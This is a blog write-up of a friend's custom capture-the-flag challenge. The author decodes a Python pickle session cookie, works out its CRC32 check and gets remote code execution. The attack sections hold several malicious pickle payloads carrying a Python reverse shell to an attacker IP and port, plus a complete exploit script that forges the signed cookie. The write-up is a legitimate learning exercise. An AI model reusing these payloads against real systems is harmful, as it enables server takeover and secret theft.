---
title:  "Capture the Nitro Writeup"
date:   2020-06-23 12:00:00 +0800
categories: writeup
header:
  overlay_color: "#000"
  overlay_filter: "0.75"
  overlay_image: /assets/images/posts/capture-the-nitro/nitro.png
toc: true
excerpt: "Free Nitro!"
---

So the story goes like this: a few weeks ago my friend took notice that I was playing CTF. He got curious and decided to make a little CTF challenge specifically for me. The prize? One month [Nitro Classic](https://discord.com/nitro) on Discord. I was like sure, sounds like fun. For the heck of it, I had decided to document my discoveries I made along the way.

## Official Hints

The following hints were shown on the front-page:

```
🚩🍪👨‍💻🗻🐧🐍🐳👤📁🚫💉
[Ask the shipmaster](https://www.youtube.com/watch?v=ryKD3xgHh1c)
🐳🤫🐱
👤🕊⚕🔑↩
```

My initial guesses when I saw the hint:

- `🚩🍪`
  - Flag is in the cookie?
- `🗻🐧`
  - Linux?
  - Alpine?
- `🐍`
  - Python?
- `🐳`
  - Docker?
- `🚫💉`
  - Database not injectable?
- "This challenge is designed specifically for you."
  - `👤🕊⚕`/`🔑↩`
  - It turns out this was supposed to be Mercy from Overwatch 🤔, so the credentials were just `mercy` and the username reversed.

## Login Page

- Powered by PHP
  - `X-Powered-By: PHP/4.4.1-gentoo`
  - `Server: Apache/1.3.41 (Unix)`
  - Pages are all suffixed with `.php`
  - ...yet the hints suggest otherwise?
- Login via POST
  - Invalid credential causes `400 Bad Request`
  - ![](/assets/images/posts/capture-the-nitro/400-bad-req.png)
- CSRF validation
  - `<input type="hidden" name="xsrf" value=$token />`
  - `Set-Cookie: xsrf_tkv=$token; Path=/`
- Protected by CloudFlare
  - `Set-Cookie: __cfduid=$cf_id; expires=Tue, 21-Jul-20 15:42:33 GMT; path=/; domain=.<redacted>.com; HttpOnly; SameSite=Lax; Secure`

## Analysis

- Database does not appear to be injectable during initial recon
- CSRF token is a Base64-encoded string
- Various hints suggest some parts of the site are not actually PHP
  - Python-based?
  - `pickle.loads`?
  - Based on the hint, we were able to login as user `mercy`
  - From the cookie structure, it looks like we're dealing with a Python3 pickled object.

### Breakdown of Sample Cookie

Raw

```
gANjYnVpbHRpbnMKZ2V0YXR0cgpxAGNjdG5fYXBwLmxvZ2luCkxvZ2luRGF0YQpxAVgIAAAAdW5yZWR1Y2VxAoZxA1JxBFgFAAAAbWVyY3lxBUdB17w+YYfm94ZxBlJxBy781fa/
```

Decoded

```
\x80\x03cbuiltins\ngetattr\nq\x00cctn_app.login\nLoginData\nq\x01X\x08\x00\x00\x00unreduceq\x02\x86q\x03Rq\x04X\x05\x00\x00\x00mercyq\x05GA\xd7\xbc>a\x87\xe6\xf7\x86q\x06Rq\x07.\xfc\xd5\xf6\xbf
```

```html
<!-- protocol 03 -->
\x80    \x03
<!-- global string -->
c   builtins\ngetattr\n
<!-- store value -->
q   \x00
<!-- global string -->
c   ctn_app.login\nLoginData\n
<!-- store value -->
q   \x01
<!-- declare unicode of size 0x08 -->
X   \x08\x00\x00\x00unreduce
<!-- store value -->
q   \x02
<!-- tuple2 -->
\x86
<!-- store value -->
q   \x03
<!-- reduce (pop from stack?) -->
R
<!-- store value -->
q   \x04
<!-- declare unicode of size 0x05 -->
<!--     our username -->
X   \x05\x00\x00\x00mercy
<!-- store value -->
q   \x05
<!-- declare float -->
<!--    our login date -->
<!--    how is this float stored??? -->
G   \x41\xd7\xbc\xe3\x61\x87\xe6\xf7
<!-- tuple2 -->
\x86
<!-- store value -->
q   \x06
<!-- reduce (pop from stack?) -->
R
<!-- store value -->
q   \x07
<!-- stop -->
.
<!-- magic number of some sort or hash? -->
<!--     changes every time we re-login -->
<!--     4-byte hash, perhaps CRC32? -->
\xfc\xd5\xf6\xbf
```

## Attempts at Rottening the Pickle

### Attempt 1 - Replacing `session_data` with malicious pickle

Unfortunately, as soon as I tried to do that, the system responded with a tamper detection alert.

Payload:

```python
'((X\x06\x00\x00\x00pythonX\x02\x00\x00\x00-cX\x8f\x00\x00\x00import sys,socket,os,pty;s=socket.socket();s.connect(("IP", PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")lisubprocess\nPopen\n.'
```

Disassembled payload:

```shell
    0: (    MARK
    1: (        MARK
    2: X            BINUNICODE 'python'
   13: X            BINUNICODE '-c'
   20: X            BINUNICODE 'import sys,socket,os,pty;s=socket.socket();s.connect(("IP", PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
  168: l            LIST       (MARK at 1)
  169: i        INST       'subprocess Popen' (MARK at 0)
  187: .    STOP
```

### Attempt 2 - Piggybacking `session_data`

Next I tried to insert the payload into the session_data before it is terminated by the `. STOP` signal. Still no dice apparently.

Payload:

```python
# Process session_data by stripping the magic number and putting it back afterwards
processed = pickled_session[:-5] + payload[:-1]+b'R'+pickled_session[-5:]
# Output
b'\x80\x03cbuiltins\ngetattr\nq\x00cctn_app.login\nLoginData\nq\x01X\x08\x00\x00\x00unreduceq\x02\x86q\x03Rq\x04X\x05\x00\x00\x00mercyq\x05GA\xd7\xbc@\xba\x01\xf8j\x86q\x06Rq\x07((X\x06\x00\x00\x00pythonX\x02\x00\x00\x00-cX\x8f\x00\x00\x00import sys,socket,os,pty;s=socket.socket();s.connect(("IP", PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")lisubprocess\nPopen\nR.l\xa9oe'
```

Disassembled payload:

```shell
    0: \x80 PROTO      3
    2: c    GLOBAL     'builtins getattr'
   20: q    BINPUT     0
   22: c    GLOBAL     'ctn_app.login LoginData'
   47: q    BINPUT     1
   49: X    BINUNICODE 'unreduce'
   62: q    BINPUT     2
   64: \x86 TUPLE2
   65: q    BINPUT     3
   67: R    REDUCE
   68: q    BINPUT     4
   70: X    BINUNICODE 'mercy'
   80: q    BINPUT     5
   82: G    BINFLOAT   1592853224.030787
   91: \x86 TUPLE2
   92: q    BINPUT     6
   94: R    REDUCE
   95: q    BINPUT     7
   97: (    MARK
   98: (        MARK
   99: X            BINUNICODE 'python'
  110: X            BINUNICODE '-c'
  117: X            BINUNICODE 'import sys,socket,os,pty;s=socket.socket();s.connect(("IP", PORT));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
  265: l            LIST       (MARK at 98)
  266: i        INST       'subprocess Popen' (MARK at 97)
  284: R    REDUCE
  285: .    STOP
```

### Attempt 3 - Packing our own payload along with CRC32 hash

At this point, I've figured out the hash at the end of the pickled data is a CRC32 one, as hinted by the ever-changing footer and its 4-byte nature. Now it is just a matter of figuring out how the hash was generated.

After analyzing for a while, it looks like the last 4-byte was indeed the pickled data CRC32 packed in little-endian.

```python
session_data = session.cookies['session_data']
pickled_session = base64.b64decode(session_data)
print("Pickle:", pickled_session)
assert pwn.pack(crc32(pickled_session[:-4]), endianness="little") == pickled_session[-4:]
```

{% capture notice-text %}

I spent an hour or two trying to figure out why my payloads weren't working. It turns out I missed 2 important factors:

1. The system was an Alpine Linux image; in a limited environment, this means `/bin/sh` or `/bin/bash` may or may not be available, especially the latter. The default shell that is shipped with Alpine is `ash`.
2. `python` wasn't working, as it should be `python3` these days.

{% endcapture %}

<div class="notice--warning">
  {{ notice-text | markdownify }}
</div>

Finally, the finished payload was the following:

> main\.py

```python
import requests, requests.cookies
import base64
import pickle, pickletools, pickle_exploit, pwn
from zlib import crc32

session = requests.Session()
session.get("https://ctn.<redacted>.com/login.php")
session.post("https://ctn.<redacted>.com/login.php", data={
    "username": "mercy",
    "password": "ycrem",
    "xsrf": session.cookies['xsrf_tkv']
})
session_data = session.cookies['session_data']
pickled_session = base64.b64decode(session_data)
print("Pickle:", pickled_session)
assert pwn.pack(crc32(pickled_session[:-4]), endianness="little") == pickled_session[-4:]
pickletools.dis(pickled_session)
payload = pickle_exploit.exploit([
    'python3',
    '-c',
    f'import sys,socket,os,pty;s=socket.socket();s.connect(("{ATTACKER_IP}", {ATTACKER_PORT}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/ash")'
])
pickletools.dis(payload)
print("Payload:", payload)
processed = payload+pwn.pack(crc32(payload), endianness="little")
print("Payload with CRC32:", processed)
processed_cookie = base64.b64encode(processed).decode()
print("Payload with CRC32 (Base64):", processed_cookie)
session.cookies.set('session_data', processed_cookie)
get = session.get('https://ctn.<redacted>.com/user.php')
print("Server returned:", get.status_code)
```

> pickle_exploit.py

```python
def exploit(command):
    assert type(command) is list
    payload_prefix = b'''(('''
    payload_suffix = b'''lisubprocess\nPopen\n.'''
    payload_body = bytes()
    for c in command:
        payload_body += b"X" + \
            bytes(struct.pack("<I", len(c))) + bytes(c, encoding="utf-8")
    payload = payload_prefix + payload_body + payload_suffix
    return payload
```

## Result

Reverse shell'd into the server, listed all the environment variables, found `/run/secrets`, got `ctn-fl4g`, sent the link over, captured the Nitro!

![](/assets/images/posts/capture-the-nitro/reverse-shell.png)

![](/assets/images/posts/capture-the-nitro/nitro.png)
